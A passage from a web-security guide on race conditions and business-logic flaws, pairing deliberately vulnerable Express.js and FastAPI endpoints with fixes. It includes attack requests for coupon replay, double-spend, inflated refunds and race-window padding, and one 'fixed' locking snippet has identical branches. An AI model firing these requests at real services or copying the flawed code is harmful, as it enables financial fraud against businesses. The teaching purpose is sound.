# Race Conditions and Business Logic Vulnerabilities: Exploiting Time-of-Check to Time-of-Use Flaws

## Meta

- **Title:** Race Conditions and Business Logic Vulnerabilities: Exploiting Time-of-Check to Time-of-Use Flaws
- **Meta Description:** A comprehensive technical guide to exploiting race conditions and business logic flaws including coupon replay, wallet double-spend, refund abuse, subscription bypass, trial abuse, inventory manipulation, and voting fraud -- with Turbo Intruder scripts, Burp Suite parallel requests, vulnerable/fixed code in Express.js and FastAPI, and database-level locking strategies.
- **Slug:** race-conditions-business-logic-vulnerabilities-toctou-exploitation
- **Keywords:** race condition exploit, business logic vulnerability, TOCTOU vulnerability, coupon replay attack, double spend vulnerability, refund abuse, subscription bypass, trial abuse, inventory manipulation, Turbo Intruder, Burp Suite race condition, Express.js race condition, FastAPI race condition, database locking, optimistic locking, pessimistic locking, bug bounty race condition

---

## Introduction

Race conditions are among the most underreported and underexplored vulnerability classes in web security. Unlike injection flaws or broken authentication, race conditions are invisible during normal testing. You will never find them by sending one request at a time. They manifest only when multiple requests arrive at exactly the same moment, exploiting the microsecond gap between when the server checks a condition and when it acts on it.

This is the Time-of-Check to Time-of-Use (TOCTOU) problem. The server reads the coupon status ("unused"), then applies the discount, then marks the coupon as used. If you send 50 requests simultaneously, all 50 read "unused" before any of them write "used." You just applied the same coupon 50 times.

Business logic vulnerabilities are the broader category. They encompass any flaw in the application's workflow that allows an attacker to achieve an outcome the business did not intend -- paying less, getting more, bypassing restrictions, or manipulating state. Race conditions are the sharpest tool for exploiting business logic, but they are not the only one.

This guide covers the full spectrum: coupon replay, wallet double-spend, refund abuse, subscription bypass, trial abuse, concurrent request exploitation, limit bypass, inventory manipulation, voting fraud, and database-level race conditions. Every technique includes real vulnerable code in Express.js and FastAPI, fixed code with proper locking, Turbo Intruder scripts, Burp Suite workflows, and detection strategies.

---

## 1. Understanding Race Conditions at the Code Level

### The Fundamental Problem

Consider this pseudocode for applying a coupon:

```
1. READ coupon from database WHERE code = "SAVE50"
2. CHECK if coupon.used == false
3. IF unused: APPLY discount to order
4. UPDATE coupon SET used = true
```

Between steps 2 and 4, there is a window -- typically 5-50 milliseconds -- where another request can also read the coupon as unused. This is the race window. If 20 requests arrive during this window, all 20 pass the check at step 2, and all 20 apply the discount at step 3. Only one of them "wins" the update at step 4, but the damage is already done.

### Why Traditional Testing Misses This

Single-request testing tools (manual Burp Repeater, curl, Postman) send requests sequentially. By the time request 2 arrives, request 1 has already completed all four steps. The coupon is marked as used, request 2 sees `used == true`, and the check passes correctly. The vulnerability is invisible.

You need simultaneous requests -- dozens of them, arriving within the same millisecond. This requires specialized tooling: Turbo Intruder, Burp Suite's "Send group in parallel" feature, or custom scripts with threading.

---

## 2. Coupon Replay Attacks

### The Vulnerability

Single-use coupons are the most common target because the business impact is clear and the exploitation is straightforward.

### Vulnerable Express.js Code

```javascript
const express = require('express');
const mongoose = require('mongoose');
const app = express();
app.use(express.json());

const couponSchema = new mongoose.Schema({
  code: { type: String, unique: true },
  discount_percent: Number,
  used: { type: Boolean, default: false },
  used_by: { type: mongoose.Schema.Types.ObjectId, ref: 'User', default: null },
  max_uses: { type: Number, default: 1 },
  current_uses: { type: Number, default: 0 }
});

const Coupon = mongoose.model('Coupon', couponSchema);

const orderSchema = new mongoose.Schema({
  user_id: mongoose.Schema.Types.ObjectId,
  total: Number,
  discount: Number,
  final_total: Number,
  coupon_code: String,
  status: String
});

const Order = mongoose.model('Order', orderSchema);

// VULNERABLE: Race condition in coupon redemption
app.post('/api/v1/orders/apply-coupon', authMiddleware, async (req, res) => {
  const { order_id, coupon_code } = req.body;

  // Step 1: READ the coupon
  const coupon = await Coupon.findOne({ code: coupon_code });

  if (!coupon) {
    return res.status(404).json({ error: 'Coupon not found' });
  }

  // Step 2: CHECK if it has been used
  // RACE WINDOW: Between this read and the update below,
  // other requests can also read used == false
  if (coupon.used) {
    return res.status(400).json({ error: 'Coupon already used' });
  }

  // Step 3: APPLY the discount
  const order = await Order.findById(order_id);
  const discount = order.total * (coupon.discount_percent / 100);
  order.discount = discount;
  order.final_total = order.total - discount;
  order.coupon_code = coupon_code;
  await order.save();

  // Step 4: MARK the coupon as used
  // By the time we get here, 20 other requests have already applied the discount
  coupon.used = true;
  coupon.used_by = req.userId;
  await coupon.save();

  res.json({
    message: 'Coupon applied',
    discount: discount,
    final_total: order.final_total
  });
});
```

### The Attack

**HTTP Request:**

```http
POST /api/v1/orders/apply-coupon HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json

{
  "order_id": "6615a1b2c3d4e5f6a7b8c9d0",
  "coupon_code": "SAVE50"
}
```

**Send 50 of these simultaneously using Turbo Intruder (see Section 13).**

**Expected outcome:** One order gets 50% off.
**Actual outcome:** Multiple orders each get 50% off, or the same order has the coupon applied repeatedly, compounding the discount.

### Fixed Express.js Code: Atomic Operation

```javascript
// SECURE: Atomic findOneAndUpdate with condition
app.post('/api/v1/orders/apply-coupon', authMiddleware, async (req, res) => {
  const { order_id, coupon_code } = req.body;

  // Atomic operation: find the coupon WHERE used == false AND update it to used == true
  // If two requests race, only ONE will match the condition and get the document back.
  // The other will get null because the document no longer matches { used: false }.
  const coupon = await Coupon.findOneAndUpdate(
    { code: coupon_code, used: false }, // condition includes used: false
    {
      $set: {
        used: true,
        used_by: req.userId,
        used_at: new Date()
      }
    },
    { new: false } // return the ORIGINAL document (before update) to get the discount
  );

  if (!coupon) {
    return res.status(400).json({ error: 'Coupon not found or already used' });
  }

  // Now apply the discount -- only one request reaches this point
  const order = await Order.findById(order_id);
  if (!order) {
    // Rollback: un-use the coupon
    await Coupon.findOneAndUpdate(
      { code: coupon_code },
      { $set: { used: false, used_by: null, used_at: null } }
    );
    return res.status(404).json({ error: 'Order not found' });
  }

  const discount = order.total * (coupon.discount_percent / 100);
  order.discount = discount;
  order.final_total = order.total - discount;
  order.coupon_code = coupon_code;
  await order.save();

  res.json({
    message: 'Coupon applied',
    discount,
    final_total: order.final_total
  });
});
```

### Fixed Express.js Code: For Max-Uses Coupons

```javascript
// SECURE: Atomic increment with condition for multi-use coupons
app.post('/api/v1/orders/apply-coupon', authMiddleware, async (req, res) => {
  const { order_id, coupon_code } = req.body;

  // Atomic: increment current_uses only if it is less than max_uses
  const coupon = await Coupon.findOneAndUpdate(
    {
      code: coupon_code,
      $expr: { $lt: ['$current_uses', '$max_uses'] } // current_uses < max_uses
    },
    {
      $inc: { current_uses: 1 },
      $push: {
        redemptions: {
          user_id: req.userId,
          redeemed_at: new Date()
        }
      }
    },
    { new: true }
  );

  if (!coupon) {
    return res.status(400).json({ error: 'Coupon not found or fully redeemed' });
  }

  // Apply discount...
  const order = await Order.findById(order_id);
  const discount = order.total * (coupon.discount_percent / 100);
  order.discount = discount;
  order.final_total = order.total - discount;
  order.coupon_code = coupon_code;
  await order.save();

  res.json({ message: 'Coupon applied', discount, final_total: order.final_total });
});
```

---

## 3. Wallet Balance Abuse (Double-Spend)

### The Vulnerability

In-app wallets, credit systems, and point balances are prime targets. The attack: spend the same $100 balance on multiple purchases simultaneously.

### Vulnerable Express.js Code

```javascript
// VULNERABLE: Read-check-update pattern without atomicity
app.post('/api/v1/wallet/transfer', authMiddleware, async (req, res) => {
  const { recipient_id, amount } = req.body;

  if (amount <= 0) {
    return res.status(400).json({ error: 'Invalid amount' });
  }

  // Step 1: READ sender's balance
  const sender = await User.findById(req.userId);

  // Step 2: CHECK if sufficient balance
  // RACE WINDOW: 20 requests all read balance as $100
  if (sender.balance < amount) {
    return res.status(400).json({ error: 'Insufficient balance' });
  }

  // Step 3: DEDUCT from sender
  sender.balance -= amount;
  await sender.save();

  // Step 4: ADD to recipient
  await User.findByIdAndUpdate(recipient_id, { $inc: { balance: amount } });

  res.json({
    message: 'Transfer complete',
    new_balance: sender.balance
  });
});
```

**The Attack:**

User has $100 balance. Send 20 simultaneous transfer requests for $100 each to 20 different accounts. All 20 requests read balance as $100 at step 1, pass the check at step 2, and proceed to transfer. The sender ends up with a negative balance (or the balance wraps around), and 20 accounts each receive $100 from a $100 starting balance -- $2,000 created from nothing.

### Fixed Express.js Code: Atomic Update with Condition

```javascript
// SECURE: Atomic balance deduction with condition
app.post('/api/v1/wallet/transfer', authMiddleware, async (req, res) => {
  const { recipient_id, amount } = req.body;

  if (amount <= 0 || !Number.isFinite(amount)) {
    return res.status(400).json({ error: 'Invalid amount' });
  }

  // Atomic: decrement balance ONLY IF it would remain >= 0
  const sender = await User.findOneAndUpdate(
    {
      _id: req.userId,
      balance: { $gte: amount } // Only match if balance >= amount
    },
    {
      $inc: { balance: -amount }
    },
    { new: true }
  );

  if (!sender) {
    return res.status(400).json({ error: 'Insufficient balance' });
  }

  // Credit recipient
  await User.findByIdAndUpdate(recipient_id, { $inc: { balance: amount } });

  // Audit log
  await TransactionLog.create({
    sender_id: req.userId,
    recipient_id,
    amount,
    sender_balance_after: sender.balance,
    timestamp: new Date(),
    type: 'transfer'
  });

  res.json({ message: 'Transfer complete', new_balance: sender.balance });
});
```

### Vulnerable FastAPI Code (PostgreSQL)

```python
# VULNERABLE: No transaction isolation, no locking
from fastapi import FastAPI, Depends, HTTPException
from sqlalchemy.orm import Session

app = FastAPI()

@app.post("/api/v1/wallet/transfer")
async def transfer(
    recipient_id: int,
    amount: float,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    # READ
    sender = db.query(User).filter(User.id == current_user.id).first()

    # CHECK -- race window between here and the commit
    if sender.balance < amount:
        raise HTTPException(status_code=400, detail="Insufficient balance")

    # UPDATE
    sender.balance -= amount
    recipient = db.query(User).filter(User.id == recipient_id).first()
    recipient.balance += amount

    db.commit()
    return {"new_balance": sender.balance}
```

### Fixed FastAPI Code (PostgreSQL with SELECT FOR UPDATE)

```python
# SECURE: Pessimistic locking with SELECT FOR UPDATE
from fastapi import FastAPI, Depends, HTTPException
from sqlalchemy.orm import Session
from sqlalchemy import text

app = FastAPI()

@app.post("/api/v1/wallet/transfer")
async def transfer(
    recipient_id: int,
    amount: float,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if amount <= 0:
        raise HTTPException(status_code=400, detail="Invalid amount")

    try:
        # BEGIN TRANSACTION (implicit with session)

        # Lock the sender's row -- other transactions block here until we commit
        sender = db.query(User).filter(
            User.id == current_user.id
        ).with_for_update().first()  # SELECT ... FOR UPDATE

        if sender.balance < amount:
            db.rollback()
            raise HTTPException(status_code=400, detail="Insufficient balance")

        # Lock the recipient's row too (prevent deadlocks by always locking in ID order)
        if current_user.id < recipient_id:
            # Sender already locked, lock recipient
            recipient = db.query(User).filter(
                User.id == recipient_id
            ).with_for_update().first()
        else:
            # Need to re-lock in order -- release and re-acquire
            # (In practice, lock in consistent order from the start)
            recipient = db.query(User).filter(
                User.id == recipient_id
            ).with_for_update().first()

        if not recipient:
            db.rollback()
            raise HTTPException(status_code=404, detail="Recipient not found")

        sender.balance -= amount
        recipient.balance += amount

        # Audit log
        transaction = TransactionLog(
            sender_id=current_user.id,
            recipient_id=recipient_id,
            amount=amount,
            sender_balance_after=sender.balance,
            recipient_balance_after=recipient.balance,
            type="transfer"
        )
        db.add(transaction)

        db.commit()
        return {"new_balance": sender.balance}

    except HTTPException:
        raise
    except Exception as e:
        db.rollback()
        raise HTTPException(status_code=500, detail="Transfer failed")
```

---

## 4. Refund Abuse

### The Vulnerability

Refund endpoints often suffer from two flaws: race conditions allowing multiple refunds for the same order, and logic flaws allowing refunds of amounts greater than the original payment.

### Vulnerable Express.js Code

```javascript
// VULNERABLE: No idempotency, no amount validation against original
app.post('/api/v1/orders/:orderId/refund', authMiddleware, async (req, res) => {
  const order = await Order.findOne({
    _id: req.params.orderId,
    user_id: req.userId
  });

  if (!order) {
    return res.status(404).json({ error: 'Order not found' });
  }

  // CHECK: is order refundable?
  // RACE WINDOW: 10 requests all see status as "delivered"
  if (order.status !== 'delivered') {
    return res.status(400).json({ error: 'Order not eligible for refund' });
  }

  // Calculate refund (using user-supplied amount -- another vulnerability)
  const refundAmount = req.body.amount || order.final_total;

  // Process refund
  await User.findByIdAndUpdate(req.userId, {
    $inc: { balance: refundAmount }
  });

  // Mark as refunded
  order.status = 'refunded';
  order.refund_amount = refundAmount;
  await order.save();

  res.json({ message: 'Refund processed', amount: refundAmount });
});
```

**Attack 1: Race condition -- send 20 refund requests simultaneously.**
All 20 read `status == "delivered"`, all 20 credit the balance, only one update to "refunded" sticks. Result: 20x the refund amount credited.

**Attack 2: Overpayment refund -- send a higher amount.**

```http
POST /api/v1/orders/6615a1b2c3d4e5f6a7b8c9d0/refund HTTP/1.1
Host: api.target.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json

{
  "amount": 99999.99
}
```

Order total was $49.99, but the refund credits $99,999.99.

### Fixed Express.js Code

```javascript
// SECURE: Atomic status change + server-side amount calculation
app.post('/api/v1/orders/:orderId/refund', authMiddleware, async (req, res) => {
  // Atomic: update status to "refunded" ONLY IF it is currently "delivered"
  const order = await Order.findOneAndUpdate(
    {
      _id: req.params.orderId,
      user_id: req.userId,
      status: 'delivered' // Only match if status is exactly "delivered"
    },
    {
      $set: {
        status: 'refunded',
        refunded_at: new Date(),
        refund_amount: undefined // We will set this after calculation
      }
    },
    { new: false } // Return original document for amount calculation
  );

  if (!order) {
    return res.status(400).json({
      error: 'Order not found or not eligible for refund'
    });
  }

  // Server calculates refund amount -- NEVER trust client input for financial values
  const refundAmount = order.final_total;

  // Credit the user
  await User.findByIdAndUpdate(req.userId, {
    $inc: { balance: refundAmount }
  });

  // Update the refund amount on the order
  await Order.findByIdAndUpdate(order._id, {
    $set: { refund_amount: refundAmount }
  });

  // Audit log
  await AuditLog.create({
    action: 'REFUND',
    order_id: order._id,
    user_id: req.userId,
    amount: refundAmount,
    original_total: order.final_total,
    timestamp: new Date()
  });

  res.json({ message: 'Refund processed', amount: refundAmount });
});
```

---

## 5. Subscription Bypass

### The Vulnerability

After a user cancels their premium subscription, the API should revoke access to premium features. Common flaws:

1. **Soft cancel without enforcement**: Subscription is marked as cancelled but the authorization middleware still checks `user.plan == "premium"` and the plan field is not updated until a background job runs.
2. **Race condition on cancellation + usage**: User cancels and simultaneously calls premium endpoints. The cancellation processes, but the premium request was already authorized.
3. **Plan downgrade without feature revocation**: User downgrades from premium to free, but cached tokens still contain `plan: "premium"`.

### Vulnerable Express.js Code

```javascript
// VULNERABLE: JWT contains plan info that is not revalidated
const jwt = require('jsonwebtoken');

// Login: embed plan in JWT
app.post('/api/v1/auth/login', async (req, res) => {
  const user = await User.findOne({ email: req.body.email });
  // ... password verification ...

  // Plan is baked into the JWT -- valid for 24 hours
  const token = jwt.sign(
    { id: user._id, email: user.email, plan: user.plan },
    process.env.JWT_SECRET,
    { expiresIn: '24h' }
  );
  res.json({ token });
});

// Premium middleware trusts the JWT claim
function requirePremium(req, res, next) {
  if (req.user.plan !== 'premium') {
    return res.status(403).json({ error: 'Premium required' });
  }
  next(); // Attacker's JWT still says "premium" for up to 24 hours after cancellation
}

// Cancel subscription endpoint
app.post('/api/v1/subscription/cancel', authMiddleware, async (req, res) => {
  await User.findByIdAndUpdate(req.userId, { plan: 'free' });
  // Problem: The user's JWT still contains plan: "premium"
  // The JWT is not revoked, refreshed, or revalidated
  res.json({ message: 'Subscription cancelled' });
});

// Premium endpoint
app.get('/api/v1/premium/reports', authMiddleware, requirePremium, async (req, res) => {
  // Attacker accesses this for 24 hours after cancellation
  const reports = await Report.find({ premium: true });
  res.json({ reports });
});
```

### Fixed Express.js Code

```javascript
// SECURE: Always check plan against database, not JWT
function requirePremium(req, res, next) {
  // Fetch current plan from database on EVERY request
  User.findById(req.userId).select('plan subscription_end_date').lean()
    .then(user => {
      if (!user || user.plan !== 'premium') {
        return res.status(403).json({ error: 'Premium subscription required' });
      }

      // Also check if subscription has expired
      if (user.subscription_end_date && new Date(user.subscription_end_date) < new Date()) {
        return res.status(403).json({ error: 'Subscription expired' });
      }

      next();
    })
    .catch(() => res.status(500).json({ error: 'Authorization check failed' }));
}

// Cancel subscription: also invalidate all sessions
app.post('/api/v1/subscription/cancel', authMiddleware, async (req, res) => {
  const session = await mongoose.startSession();
  try {
    session.startTransaction();

    await User.findByIdAndUpdate(
      req.userId,
      {
        plan: 'free',
        cancelled_at: new Date(),
        // Increment token version to invalidate all existing JWTs
        $inc: { token_version: 1 }
      },
      { session }
    );

    await AuditLog.create([{
      action: 'SUBSCRIPTION_CANCEL',
      user_id: req.userId,
      timestamp: new Date()
    }], { session });

    await session.commitTransaction();
    res.json({ message: 'Subscription cancelled. Please log in again.' });
  } catch (err) {
    await session.abortTransaction();
    res.status(500).json({ error: 'Cancellation failed' });
  } finally {
    session.endSession();
  }
});

// Auth middleware: validate token version
async function authMiddleware(req, res, next) {
  const token = req.headers.authorization?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token' });

  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    const user = await User.findById(decoded.id).select('token_version').lean();

    // Reject if token version has been incremented (e.g., after subscription cancel)
    if (!user || decoded.token_version !== user.token_version) {
      return res.status(401).json({ error: 'Token revoked. Please log in again.' });
    }

    req.userId = decoded.id;
    req.user = decoded;
    next();
  } catch {
    res.status(401).json({ error: 'Invalid token' });
  }
}
```

---

## 6. Trial Abuse (Infinite Free Trials)

### The Vulnerability

Applications offer 7-day or 14-day free trials. Users create multiple accounts to get unlimited free access. Weak trial tracking also enables single-account abuse.

### Common Flaws

1. **Email-only uniqueness**: User registers with `test+1@gmail.com`, `test+2@gmail.com`, etc. Gmail ignores the `+` suffix.
2. **No device/browser fingerprinting**: Same device creates 100 trial accounts.
3. **Trial reset on profile update**: Changing the email resets the trial period.
4. **Coupon-based trial extension**: Applying a trial extension coupon has no limit.

### Vulnerable FastAPI Code

```python
# VULNERABLE: Trial tracked only by email, easily bypassed
from fastapi import FastAPI, HTTPException
from datetime import datetime, timedelta

app = FastAPI()

@app.post("/api/v1/auth/register")
async def register(email: str, password: str, db: Session = Depends(get_db)):
    # Only checks exact email match
    existing = db.query(User).filter(User.email == email).first()
    if existing:
        raise HTTPException(status_code=409, detail="Email already registered")

    user = User(
        email=email,
        password_hash=hash_password(password),
        plan="trial",
        trial_end=datetime.utcnow() + timedelta(days=14)
    )
    db.add(user)
    db.commit()
    return {"message": "Trial started", "trial_end": user.trial_end}

# VULNERABLE: Email update resets trial
@app.put("/api/v1/users/profile")
async def update_profile(
    email: str = None,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if email:
        current_user.email = email
        # Bug: trial_end is recalculated whenever email changes
        if current_user.plan == "trial" or current_user.plan == "expired_trial":
            current_user.plan = "trial"
            current_user.trial_end = datetime.utcnow() + timedelta(days=14)

    db.commit()
    return {"message": "Profile updated"}
```

### Fixed FastAPI Code

```python
# SECURE: Comprehensive trial abuse prevention
import hashlib
from datetime import datetime, timedelta
from fastapi import FastAPI, HTTPException, Request

app = FastAPI()

def normalize_email(email: str) -> str:
    """Normalize email to prevent +tag and dot bypasses."""
    local, domain = email.lower().strip().split('@')

    # Gmail: remove dots and +tags
    if domain in ('gmail.com', 'googlemail.com'):
        local = local.split('+')[0]  # Remove +tag
        local = local.replace('.', '')  # Remove dots
        domain = 'gmail.com'  # Normalize googlemail.com

    # General: remove +tags for all providers
    local = local.split('+')[0]

    return f"{local}@{domain}"

def fingerprint_device(request: Request) -> str:
    """Create a device fingerprint from request metadata."""
    components = [
        request.headers.get('user-agent', ''),
        request.headers.get('accept-language', ''),
        request.client.host,  # IP address
    ]
    return hashlib.sha256('|'.join(components).encode()).hexdigest()

@app.post("/api/v1/auth/register")
async def register(
    email: str,
    password: str,
    request: Request,
    db: Session = Depends(get_db)
):
    normalized = normalize_email(email)

    # Check normalized email
    existing = db.query(User).filter(User.normalized_email == normalized).first()
    if existing:
        raise HTTPException(status_code=409, detail="Email already registered")

    # Check device fingerprint for trial abuse
    device_fp = fingerprint_device(request)
    recent_trials = db.query(User).filter(
        User.device_fingerprint == device_fp,
        User.created_at > datetime.utcnow() - timedelta(days=90)
    ).count()

    if recent_trials >= 1:
        # This device already had a trial -- no new trial
        plan = "free"
        trial_end = None
    else:
        plan = "trial"
        trial_end = datetime.utcnow() + timedelta(days=14)

    user = User(
        email=email,
        normalized_email=normalized,
        password_hash=hash_password(password),
        plan=plan,
        trial_end=trial_end,
        trial_started_at=datetime.utcnow() if plan == "trial" else None,
        device_fingerprint=device_fp,
        registration_ip=request.client.host
    )
    db.add(user)
    db.commit()
    return {"message": f"Account created with {plan} plan", "trial_end": trial_end}

@app.put("/api/v1/users/profile")
async def update_profile(
    email: str = None,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    if email:
        current_user.email = email
        current_user.normalized_email = normalize_email(email)
        # NEVER reset trial on email change
        # trial_end remains unchanged

    db.commit()
    return {"message": "Profile updated"}
```

---

## 7. Concurrent Request Exploitation (TOCTOU Deep Dive)

### Understanding the Race Window

The TOCTOU window size depends on:

1. **Database query latency**: 1-50ms per query.
2. **Application logic between check and use**: Discount calculations, external API calls, etc.
3. **Server load**: Under high load, the window widens because operations take longer.
4. **Database type**: NoSQL databases without transactions (MongoDB pre-4.0) are especially vulnerable.

### Widening the Race Window

Attackers can deliberately widen the race window by:

```http
# Send a large payload that takes longer to parse
POST /api/v1/orders/apply-coupon HTTP/1.1
Content-Type: application/json

{
  "order_id": "6615a1b2c3d4e5f6a7b8c9d0",
  "coupon_code": "SAVE50",
  "padding": "AAAA....(100KB of padding)....AAAA"
}
```

```http
# Include fields that trigger expensive validation
POST /api/v1/wallet/transfer HTTP/1.1
Content-Type: application/json

{
  "recipient_id": "507f1f77bcf86cd799439011",
  "amount": 100,
  "note": "A very long transfer note that the server has to validate and sanitize..."
}
```

### Single-Endpoint vs Cross-Endpoint Races

**Single-endpoint race**: Send the same request to the same endpoint simultaneously (coupon replay).

**Cross-endpoint race**: Send requests to different endpoints that interact with the same shared state simultaneously.

Example -- buy and refund at the same time:

```
Thread 1: POST /api/v1/orders/6615a1b2/pay     (deducts $100 from wallet)
Thread 2: POST /api/v1/orders/6615a1b2/refund   (adds $100 to wallet)
```

If both execute concurrently, the pay deducts $100 and the refund adds $100, but the order might end up in a state where it is both paid and refunded, letting the user keep the product and get the money back.

---

## 8. Limit Bypass via Race Conditions

### Rate Limit Bypass

```python
# Application rate limiting code (vulnerable to race conditions)
async def check_rate_limit(user_id, action, limit, window):
    key = f"ratelimit:{action}:{user_id}"
    count = await redis.get(key)

    # RACE WINDOW: 50 requests all read count as 0
    if count and int(count) >= limit:
        raise HTTPException(status_code=429, detail="Rate limit exceeded")

    # INCREMENT: all 50 requests increment, but all passed the check
    await redis.incr(key)
    if not count:
        await redis.expire(key, window)
```

**Fixed: Atomic increment with Lua script.**

```python
# SECURE: Atomic rate limiting with Redis Lua script
RATE_LIMIT_SCRIPT = """
local key = KEYS[1]
local limit = tonumber(ARGV[1])
local window = tonumber(ARGV[2])

local current = redis.call('INCR', key)

if current == 1 then
    redis.call('EXPIRE', key, window)
end

if current > limit then
    return 0
end

return 1
"""

async def check_rate_limit(user_id: str, action: str, limit: int, window: int):
    key = f"ratelimit:{action}:{user_id}"
    # Lua script executes atomically -- no race window
    allowed = await redis.eval(RATE_LIMIT_SCRIPT, 1, key, limit, window)
    if not allowed:
        raise HTTPException(status_code=429, detail="Rate limit exceeded")
```

### Withdrawal Limit Bypass

```javascript
// VULNERABLE: Daily withdrawal limit check
app.post('/api/v1/wallet/withdraw', authMiddleware, async (req, res) => {
  const { amount } = req.body;
  const DAILY_LIMIT = 10000;

  // Calculate today's total withdrawals
  const today = new Date();
  today.setHours(0, 0, 0, 0);

  const todayTotal = await Transaction.aggregate([
    {
      $match: {
        user_id: mongoose.Types.ObjectId(req.userId),
        type: 'withdrawal',
        created_at: { $gte: today }
      }
    },
    { $group: { _id: null, total: { $sum: '$amount' } } }
  ]);

  const currentTotal = todayTotal[0]?.total || 0;

  // RACE WINDOW: 10 requests all see currentTotal as $0
  if (currentTotal + amount > DAILY_LIMIT) {
    return res.status(400).json({ error: 'Daily withdrawal limit exceeded' });
  }

  // Process withdrawal
  await User.findByIdAndUpdate(req.userId, { $inc: { balance: -amount } });
  await Transaction.create({
    user_id: req.userId,
    type: 'withdrawal',
    amount,
    created_at: new Date()
  });

  res.json({ message: 'Withdrawal processed' });
});
```

**Attack:** Send 10 simultaneous $10,000 withdrawal requests. All 10 read `currentTotal` as $0, all 10 pass the limit check. Total withdrawn: $100,000 against a $10,000 daily limit.

### Fixed Code: Pessimistic Locking

```javascript
// SECURE: Use MongoDB transaction with lock
app.post('/api/v1/wallet/withdraw', authMiddleware, async (req, res) => {
  const { amount } = req.body;
  const DAILY_LIMIT = 10000;

  const session = await mongoose.startSession();
  try {
    session.startTransaction({
      readConcern: { level: 'snapshot' },
      writeConcern: { w: 'majority' }
    });

    // Lock the user document
    const user = await User.findById(req.userId).session(session);

    if (user.balance < amount) {
      await session.abortTransaction();
      return res.status(400).json({ error: 'Insufficient balance' });
    }

    // Calculate today's total within the transaction
    const today = new Date();
    today.setHours(0, 0, 0, 0);

    const todayTotal = await Transaction.aggregate([
      {
        $match: {
          user_id: mongoose.Types.ObjectId(req.userId),
          type: 'withdrawal',
          created_at: { $gte: today }
        }
      },
      { $group: { _id: null, total: { $sum: '$amount' } } }
    ]).session(session);

    const currentTotal = todayTotal[0]?.total || 0;

    if (currentTotal + amount > DAILY_LIMIT) {
      await session.abortTransaction();
      return res.status(400).json({ error: 'Daily withdrawal limit exceeded' });
    }

    // Deduct and record atomically
    user.balance -= amount;
    await user.save({ session });

    await Transaction.create([{
      user_id: req.userId,
      type: 'withdrawal',
      amount,
      created_at: new Date()
    }], { session });

    await session.commitTransaction();
    res.json({ message: 'Withdrawal processed', new_balance: user.balance });
  } catch (err) {
    await session.abortTransaction();
    res.status(500).json({ error: 'Withdrawal failed' });
  } finally {
    session.endSession();
  }
});
```

---

## 9. Inventory Manipulation

### The Vulnerability

E-commerce applications check stock levels before allowing a purchase. With race conditions, multiple users can buy the same "last item" simultaneously.

### Vulnerable FastAPI Code

```python
# VULNERABLE: Stock check without locking
@app.post("/api/v1/orders/purchase")
async def purchase(
    product_id: int,
    quantity: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    product = db.query(Product).filter(Product.id == product_id).first()

    if not product:
        raise HTTPException(status_code=404, detail="Product not found")

    # RACE WINDOW: 100 requests all see stock as 1
    if product.stock < quantity:
        raise HTTPException(status_code=400, detail="Insufficient stock")

    # Deduct stock
    product.stock -= quantity

    # Create order
    order = Order(
        user_id=current_user.id,
        product_id=product_id,
        quantity=quantity,
        total=product.price * quantity,
        status="confirmed"
    )
    db.add(order)
    db.commit()

    return {"order_id": order.id, "total": order.total}
```

**Attack:** Product has 1 unit in stock. Send 50 simultaneous purchase requests. All 50 read `stock == 1`, all 50 pass the check, all 50 create orders. Stock goes to -49.

### Fixed FastAPI Code

```python
# SECURE: Optimistic locking with version column
from sqlalchemy import Column, Integer, Float, String
from sqlalchemy.orm import Session
from sqlalchemy.exc import IntegrityError

class Product(Base):
    __tablename__ = "products"
    id = Column(Integer, primary_key=True)
    name = Column(String)
    price = Column(Float)
    stock = Column(Integer)
    version = Column(Integer, default=0)  # Optimistic lock version

@app.post("/api/v1/orders/purchase")
async def purchase(
    product_id: int,
    quantity: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    MAX_RETRIES = 3

    for attempt in range(MAX_RETRIES):
        product = db.query(Product).filter(Product.id == product_id).first()

        if not product:
            raise HTTPException(status_code=404, detail="Product not found")

        if product.stock < quantity:
            raise HTTPException(status_code=400, detail="Insufficient stock")

        # Optimistic lock: UPDATE only if version has not changed
        rows_updated = db.query(Product).filter(
            Product.id == product_id,
            Product.version == product.version,  # Version check
            Product.stock >= quantity             # Stock re-check
        ).update({
            Product.stock: Product.stock - quantity,
            Product.version: Product.version + 1  # Increment version
        }, synchronize_session=False)

        if rows_updated == 0:
            db.rollback()
            # Another transaction modified this product -- retry
            continue

        # Create order
        order = Order(
            user_id=current_user.id,
            product_id=product_id,
            quantity=quantity,
            total=product.price * quantity,
            status="confirmed"
        )
        db.add(order)
        db.commit()

        return {"order_id": order.id, "total": order.total}

    raise HTTPException(status_code=409, detail="Conflict: please retry")
```

**Alternative: PostgreSQL Advisory Locks**

```python
# SECURE: PostgreSQL advisory lock for critical sections
@app.post("/api/v1/orders/purchase")
async def purchase(
    product_id: int,
    quantity: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    # Advisory lock keyed on product_id -- serializes all purchases for this product
    db.execute(text("SELECT pg_advisory_xact_lock(:lock_id)"), {"lock_id": product_id})

    product = db.query(Product).filter(Product.id == product_id).first()

    if not product or product.stock < quantity:
        raise HTTPException(status_code=400, detail="Insufficient stock")

    product.stock -= quantity

    order = Order(
        user_id=current_user.id,
        product_id=product_id,
        quantity=quantity,
        total=product.price * quantity,
        status="confirmed"
    )
    db.add(order)
    db.commit()
    # Advisory lock is automatically released on commit/rollback

    return {"order_id": order.id, "total": order.total}
```

---

## 10. Voting/Rating Manipulation via Race Conditions

### The Vulnerability

Applications that allow one vote per user per item check for existing votes before inserting a new one. Race conditions bypass this check.

### Vulnerable Code

```javascript
// VULNERABLE: Check-then-insert for voting
app.post('/api/v1/posts/:postId/vote', authMiddleware, async (req, res) => {
  const { postId } = req.params;
  const { direction } = req.body; // "up" or "down"

  // CHECK: has user already voted?
  // RACE WINDOW: 50 requests all see existingVote as null
  const existingVote = await Vote.findOne({
    user_id: req.userId,
    post_id: postId
  });

  if (existingVote) {
